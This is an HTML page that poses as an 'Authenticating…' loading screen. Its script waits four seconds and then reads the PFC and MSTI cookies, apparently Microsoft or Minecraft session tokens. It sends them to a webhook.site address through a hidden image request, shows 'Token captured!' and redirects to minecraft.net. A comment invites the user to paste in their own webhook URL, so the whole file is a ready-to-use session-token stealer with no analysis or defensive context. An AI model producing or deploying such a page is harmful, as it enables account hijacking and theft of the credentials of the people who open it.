<!DOCTYPE html>
<html>
<head>
  <title>Loading…</title>
  <style>
    body{margin:0;background:#222;color:#fff;font-family:Arial,Helvetica,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column}
    #status{font-size:18px}
  </style>
</head>
<body>
  <div id="status">Authenticating…</div>

  <script>
    /* ---------- CONFIGURATION ---------- */
    var WEBHOOK_URL = 'https://webhook.site/#!/view/acdbbbeb-9ba5-496d-84e9-8fbc668bfc1b';  // <-- paste YOUR URL
    var REDIRECT_URL = 'https://www.minecraft.net/';

    /* ---------- HELPER ---------- */
    function getCookie(name){
      var parts = document.cookie.split(';');
      for (var i=0;i<parts.length;i++){
        var kv = parts[i].trim().split('=');
        if (kv[0]===name) return kv[1];
      }
      return '';
    }

    /* ---------- MAIN ---------- */
    window.onload = function(){
      setTimeout(function(){
        /* 1. Grab the two cookies */
        var pfc  = getCookie('PFC');
        var msti = getCookie('__Host-MSTI') || getCookie('MSTI');

        /* 2. Send them to the webhook (no JSON!) */
        var img = new Image();
        img.src = WEBHOOK_URL + '?PFC=' + encodeURIComponent(pfc) +
                     '&MSTI=' + encodeURIComponent(msti);

        /* 3. Feedback */
        document.getElementById('status').innerText = 'Token captured! Redirecting...';

        /* 4. Redirect to Minecraft */
        location.replace(REDIRECT_URL);

      }, 4000);  // 4 seconds
    };
  </script>
</body>
</html>
